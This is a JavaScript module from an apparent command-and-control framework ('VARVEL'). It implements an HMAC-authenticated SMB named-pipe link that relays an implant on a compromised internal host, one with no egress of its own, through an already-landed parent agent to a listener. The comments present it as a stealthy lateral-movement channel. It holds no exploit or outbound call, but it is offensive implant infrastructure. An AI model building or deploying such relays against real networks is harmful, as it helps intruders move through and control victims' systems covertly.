// VARVEL — pivot mesh: the SMB named-pipe LINK transport, pure codec + session core
// (gap #4b, stage 1). No sockets in this module — the I/O lives in
// agents/pipeendpoint.mjs (Windows pipes via node:net) and the listener-side relay in
// engine/callback.mjs (the /l route). Everything here is hermetically testable.
//
// WHAT A LINK IS: a child agent on a freshly-landed internal host has NO egress of its
// own. It reaches the listener THROUGH an already-landed parent agent: child ↔ parent's
// named pipe (internal SMB — the stealthiest lateral channel there is), parent ↔ listener
// over the parent's own governed channel. This module is the wire contract between child
// and parent.
//
// WIRE FORMAT (over the pipe byte stream):
//   [u32le payloadLength][utf8 JSON frame]   — length-prefixed, 1..MAX_FRAME, fail-closed.
//   Frame = { t, v, ... } with t in { hello, welcome, up, down, bye }.
//
// HANDSHAKE (child proves itself WITHOUT the parent ever holding the child's token):
//   · The listener enrolls the child (registerLinkedAgent) and hands the PARENT a derived,
//     link-scoped verify key: verifyKey = HMAC(childToken, 'varvel-link:' + linkId).
//   · hello:   { t:'hello', v, link, a: childId, n: nonce, h: HMAC(verifyKey, 'hello:'+link+':'+a+':'+n) }
//   · welcome: { t:'welcome', v, link, a, n, h: HMAC(sessDownKey, 'welcome:'+link+':'+a+':'+n) }
//     — the welcome proves the parent side knew the verify key (mutual authentication).
//   · Session keys per link-session nonce: sessUp = HMAC(verifyKey, 'sess-up:'+nonce),
//     sessDown = HMAC(verifyKey, 'sess-down:'+nonce) — two independent directional chains.
//
// DATA FRAMES (post-handshake), HMAC-CHAINED like the other channels' seq discipline:
//   up:   { t:'up',   s, m, p } — p is the EXACT governed channel payload the child would
//         send on a direct wire ({a,s,h} pull / {a,s,h,t,k,i,n,d} push). The inner HMAC is
//         end-to-end child↔listener; the parent CANNOT verify or forge it (blind relay by
//         design: a compromised parent can drop but never impersonate the child).
//   down: { t:'down', s, m, p } — p is the channel's reply STRING ('' idle/deny, or the
//         b32 task reply), byte-identical to what a direct /d answer would carry.
//   m = HMAC(dirKey, prevMac + ':' + s + ':' + t + ':' + canonical(p)), chained from
//       genesis = HMAC(dirKey, 'genesis'). s strictly increases per direction from 1.
//       A broken chain or a skipped/replayed seq is a PipeLinkError — the endpoint kills
//       the connection (fail-closed) and audits.
//   bye:  chained like data, carries a reason string — graceful link death.
//
// GOVERNANCE NOTES:
//   · The pipe segment authenticates the HOP (child↔pipe). The payload inside authenticates
//     the AGENT to the LISTENER with the same HMAC/token/replay discipline as every other
//     transport (it flows through the channel's shared governed intake unchanged).
//   · Link-death detection is layered: the stream's own close (net layer, stage 2) plus an
//     inactivity predicate here (isDead) the parent reaps on and audits. No silent zombies.
//   · canonical() (sorted-key JSON) makes the chain MAC independent of object key order.

import { createHmac, randomBytes } from 'node:crypto';

export const LINK_VERSION = 1;
export const MAX_FRAME = 1024 * 1024;        // length-prefix cap (fail-closed beyond)
export const LINK_TIMEOUT_MS = 120_000;      // default inactivity death for a link session
export const NONCE_RE = /^[0-9a-f]{16,64}$/; // 8..32 random bytes, hex

const hmacHex = (key, msg) => createHmac('sha256', String(key)).update(String(msg)).digest('hex');

// Typed failure — endpoints catch PipeLinkError, audit, and kill the connection.
export class PipeLinkError extends Error {
  constructor(message, code = 'link') {
    super(message);
    this.name = 'PipeLinkError';
    this.code = code; // 'frame' | 'hello' | 'chain' | 'seq' | 'state'
  }
}

// Deterministic JSON (sorted keys, recursive) — the chain-MAC input must not depend on
// the construction-time key order of the payload object.
export function canonical(v) {
  if (v === null || typeof v !== 'object') return JSON.stringify(v);
  if (Array.isArray(v)) return '[' + v.map(canonical).join(',') + ']';
  return '{' + Object.keys(v).sort().map((k) => JSON.stringify(k) + ':' + canonical(v[k])).join(',') + '}';
}

// ——— link identity + key derivation ———
export function validLinkId(linkId) {
  return typeof linkId === 'string' && /^[a-z0-9]{4,24}$/.test(linkId);
}

// The pipe name for a link. The namespace is GOVERNED: pipe names derive from the link id
// (an operator never picks an arbitrary name), so every mesh pipe is self-describing.
export function pipeNameFor(linkId) {
  if (!validLinkId(linkId)) throw new PipeLinkError('invalid link id: ' + String(linkId), 'hello');
  return 'varvel_link_' + linkId;
}

// What the PARENT holds: a link-scoped derivative of the child's token. It verifies the
// child's hello and anchors the session chains — and is USELESS for speaking to the
// listener as the child (the payloads' inner HMACs need the token itself).
export function deriveVerifyKey(childToken, linkId) {
  if (!validLinkId(linkId)) throw new PipeLinkError('invalid link id: ' + String(linkId), 'hello');
  return hmacHex(childToken, 'varvel-link:' + linkId);
}

const helloMac = (verifyKey, linkId, agentId, nonce) => hmacHex(verifyKey, ['hello', linkId, agentId, nonce].join(':'));
const sessKeys = (verifyKey, nonce) => ({ up: hmacHex(verifyKey, 'sess-up:' + nonce), down: hmacHex(verifyKey, 'sess-down:' + nonce) });
const welcomeMac = (verifyKey, linkId, agentId, nonce) => hmacHex(sessKeys(verifyKey, nonce).down, ['welcome', linkId, agentId, nonce].join(':'));

// ——— stream framing ———
export function encodeFrame(obj) {
  const body = Buffer.from(JSON.stringify(obj), 'utf8');
  if (!body.length || body.length > MAX_FRAME) throw new PipeLinkError('frame body ' + body.length + ' outside 1..' + MAX_FRAME, 'frame');
  const head = Buffer.alloc(4);
  head.writeUInt32LE(body.length, 0);
  return Buffer.concat([head, body]);
}

// Streaming length-prefix parser: frames survive arbitrary pipe/TCP chunking and complete
// exactly once. Fail-closed: an impossible length or a non-JSON/untyped body throws.
export class FrameParser {
  constructor({ maxFrame = MAX_FRAME } = {}) {
    this.maxFrame = maxFrame;
    this.buf = Buffer.alloc(0);
  }
  feed(chunk) {
    this.buf = this.buf.length ? Buffer.concat([this.buf, chunk]) : chunk;
    const out = [];
    for (;;) {
      if (this.buf.length < 4) return out;
      const len = this.buf.readUInt32LE(0);
      if (len < 1 || len > this.maxFrame) throw new PipeLinkError('frame length ' + len + ' outside 1..' + this.maxFrame, 'frame');
      if (this.buf.length < 4 + len) return out;
      const body = this.buf.subarray(4, 4 + len);
      this.buf = this.buf.subarray(4 + len);
      let obj = null;
      try { obj = JSON.parse(body.toString('utf8')); } catch { throw new PipeLinkError('frame body is not JSON', 'frame'); }
      if (!obj || typeof obj !== 'object' || typeof obj.t !== 'string') throw new PipeLinkError('frame lacks a string type', 'frame');
      out.push(obj);
    }
  }
}

// ——— the link session (both ends share this core) ———
// Directional chains: `up` is child→parent, `down` is parent→child. Each direction has its
// own key, its own strictly-increasing seq from 1, and a running MAC seeded with a genesis.
export class LinkSession {
  constructor({ linkId, agentId, verifyKey, nonce, now } = {}) {
    if (!validLinkId(linkId)) throw new PipeLinkError('invalid link id', 'hello');
    if (!agentId || typeof agentId !== 'string') throw new PipeLinkError('agent id required', 'hello');
    if (!verifyKey || typeof verifyKey !== 'string') throw new PipeLinkError('verify key required', 'hello');
    if (!NONCE_RE.test(String(nonce || ''))) throw new PipeLinkError('nonce must be 16..64 lowercase hex chars', 'hello');
    this.linkId = linkId;
    this.agentId = agentId;
    this.nonce = nonce;
    this._verifyKey = verifyKey;
    const keys = sessKeys(verifyKey, nonce);
    this._up = { key: keys.up, mac: hmacHex(keys.up, 'genesis'), seq: 0 };
    this._down = { key: keys.down, mac: hmacHex(keys.down, 'genesis'), seq: 0 };
    this.createdAt = now || Date.now();
    this.lastSeen = this.createdAt;
    this.closed = false;
  }

  _seal(dir, t, p) {
    if (this.closed) throw new PipeLinkError('session is closed', 'state');
    const d = dir === 'up' ? this._up : this._down;
    d.seq++;
    d.mac = hmacHex(d.key, d.mac + ':' + d.seq + ':' + t + ':' + canonical(p === undefined ? '' : p));
    return { t, v: LINK_VERSION, s: d.seq, m: d.mac, p };
  }

  _open(dir, t, frame) {
    const d = dir === 'up' ? this._up : this._down;
    if (!frame || typeof frame !== 'object' || frame.t !== t) throw new PipeLinkError('expected a ' + t + ' frame', 'state');
    if (frame.v !== LINK_VERSION) throw new PipeLinkError('unsupported link version ' + String(frame.v), 'state');
    if (!Number.isInteger(frame.s)) throw new PipeLinkError('frame seq is not an integer', 'seq');
    if (typeof frame.m !== 'string' || !/^[0-9a-f]{64}$/.test(frame.m)) throw new PipeLinkError('frame mac is not a sha256 hex', 'chain');
    if (frame.s !== d.seq + 1) throw new PipeLinkError('seq ' + frame.s + ' is not the expected ' + (d.seq + 1) + ' (replay or gap)', 'seq');
    const expect = hmacHex(d.key, d.mac + ':' + frame.s + ':' + frame.t + ':' + canonical(frame.p === undefined ? '' : frame.p));
    if (frame.m !== expect) throw new PipeLinkError('chain mac mismatch (forgery or desync)', 'chain');
    d.seq = frame.s;
    d.mac = frame.m;
    this.lastSeen = Date.now();
    return frame.p;
  }

  sealUp(p) { return this._seal('up', 'up', p); }
  openUp(frame) { return this._open('up', 'up', frame); }
  sealDown(p) { return this._seal('down', 'down', p); }
  openDown(frame) { return this._open('down', 'down', frame); }
  sealBye(reason) { return this._seal('up', 'bye', String(reason || '').slice(0, 80)); }
  openBye(frame, dir = 'up') { const reason = this._open(dir, 'bye', frame); this.closed = true; return reason; }

  // Inactivity death predicate — the endpoint's stream-close handles the abrupt case;
  // this catches the silent zombie (peer half-alive, no frames). Default 120s.
  isDead(now, timeoutMs = LINK_TIMEOUT_MS) {
    if (this.closed) return true;
    return (Number(now) || Date.now()) - this.lastSeen > Math.max(1000, Number(timeoutMs) || LINK_TIMEOUT_MS);
  }
}

// ——— child side ———
// The child HAS its token (issued at enrollment) and derives the verify key itself; the
// parent only ever stores the derivative. makeHello/acceptWelcome bracket the handshake.
export class ChildLink extends LinkSession {
  constructor({ linkId, agentId, token, nonce, now } = {}) {
    if (!token || typeof token !== 'string') throw new PipeLinkError('child token required', 'hello');
    super({ linkId, agentId, verifyKey: deriveVerifyKey(token, linkId), nonce: nonce || randomBytes(8).toString('hex'), now });
  }
  makeHello() {
    return { t: 'hello', v: LINK_VERSION, link: this.linkId, a: this.agentId, n: this.nonce, h: helloMac(this._verifyKey, this.linkId, this.agentId, this.nonce) };
  }
  // Validate the parent's welcome: right link/agent, OUR nonce (replay of an old welcome
  // fails), and a MAC that proves knowledge of the verify key. Throws on any mismatch.
  acceptWelcome(frame) {
    if (!frame || typeof frame !== 'object' || frame.t !== 'welcome') throw new PipeLinkError('expected a welcome frame', 'hello');
    if (frame.v !== LINK_VERSION || frame.link !== this.linkId || frame.a !== this.agentId || frame.n !== this.nonce) {
      throw new PipeLinkError('welcome does not match this link/agent/nonce', 'hello');
    }
    if (frame.h !== welcomeMac(this._verifyKey, this.linkId, this.agentId, this.nonce)) throw new PipeLinkError('welcome mac mismatch — the peer does not hold the link key', 'hello');
    this.lastSeen = Date.now();
    return true;
  }
}

// ——— parent side: the link's session registry (pure; the pipe server drives it) ———
// children: Map/object childId -> verifyKey (what registerLinkedAgent handed the parent
// in its link-listen task). The hub NEVER sees a child token.
export class ParentLinkHub {
  constructor({ linkId, children = {}, onEvent, linkTimeoutMs = LINK_TIMEOUT_MS } = {}) {
    if (!validLinkId(linkId)) throw new PipeLinkError('invalid link id: ' + String(linkId), 'hello');
    this.linkId = linkId;
    this.linkTimeoutMs = linkTimeoutMs;
    this.onEvent = typeof onEvent === 'function' ? onEvent : () => {};
    this._children = new Map(children instanceof Map ? children : Object.entries(children));
    this._sessions = new Map(); // childId -> LinkSession
  }
  _emit(type, obj) { try { this.onEvent(type, { link: this.linkId, ...obj }); } catch { /* audit must never break the hub */ } }

  addChild(agentId, verifyKey) {
    if (typeof agentId !== 'string' || !agentId || typeof verifyKey !== 'string' || !/^[0-9a-f]{64}$/.test(verifyKey)) {
      throw new PipeLinkError('addChild needs { childId, verifyKey(64-hex) }', 'hello');
    }
    this._children.set(agentId, verifyKey);
    return true;
  }
  removeChild(agentId) {
    this._children.delete(agentId);
    this.dropSession(agentId, 'unenrolled');
  }
  childKnown(agentId) { return this._children.has(agentId); }
  getSession(agentId) { return this._sessions.get(agentId) || null; }
  childCount() { return this._children.size; }

  // Validate a child's hello and open a session. Returns { session, welcome }. A second
  // hello for the same child REPLACES the stale session (the old pipe is dead or dying —
  // same doctrine as the ws transport's reconnect-replaces). Throws PipeLinkError on any
  // violation; the caller audits + kills the connection.
  acceptHello(frame, { now } = {}) {
    if (!frame || typeof frame !== 'object' || frame.t !== 'hello') throw new PipeLinkError('first frame must be hello', 'hello');
    if (frame.v !== LINK_VERSION) throw new PipeLinkError('unsupported link version ' + String(frame.v), 'hello');
    if (frame.link !== this.linkId) throw new PipeLinkError('hello names a different link', 'hello');
    const agentId = String(frame.a || '');
    const nonce = String(frame.n || '');
    const verifyKey = this._children.get(agentId);
    if (!verifyKey) throw new PipeLinkError('child ' + agentId + ' is not enrolled on this link', 'hello');
    if (!NONCE_RE.test(nonce)) throw new PipeLinkError('bad nonce shape', 'hello');
    if (typeof frame.h !== 'string' || frame.h !== helloMac(verifyKey, this.linkId, agentId, nonce)) {
      throw new PipeLinkError('hello mac mismatch', 'hello');
    }
    const prior = this._sessions.get(agentId);
    if (prior && !prior.closed) this._emit('link.replaced', { child: agentId });
    const session = new LinkSession({ linkId: this.linkId, agentId, verifyKey, nonce, now });
    this._sessions.set(agentId, session);
    const welcome = { t: 'welcome', v: LINK_VERSION, link: this.linkId, a: agentId, n: nonce, h: welcomeMac(verifyKey, this.linkId, agentId, nonce) };
    this._emit('link.up', { child: agentId, replaced: !!prior });
    return { session, welcome };
  }

  dropSession(agentId, reason = 'closed') {
    const s = this._sessions.get(agentId);
    if (!s) return false;
    this._sessions.delete(agentId);
    if (!s.closed) s.closed = true;
    this._emit('link.down', { child: agentId, reason: String(reason).slice(0, 60) });
    return true;
  }

  // Reap sessions whose inactivity exceeds the link timeout. Returns the dead child ids.
  reapDead({ now, timeoutMs } = {}) {
    const t = Number(now) || Date.now();
    const ms = Math.max(1000, Number(timeoutMs) || this.linkTimeoutMs);
    const dead = [];
    for (const [agentId, s] of this._sessions) {
      if (s.isDead(t, ms)) {
        this._sessions.delete(agentId);
        s.closed = true;
        dead.push(agentId);
        this._emit('link.dead', { child: agentId, idleMs: t - s.lastSeen });
      }
    }
    return dead;
  }

  sessionsView() {
    return [...this._sessions.values()].map((s) => ({ child: s.agentId, up: s._up.seq, down: s._down.seq, lastSeen: s.lastSeen, closed: s.closed }));
  }
}
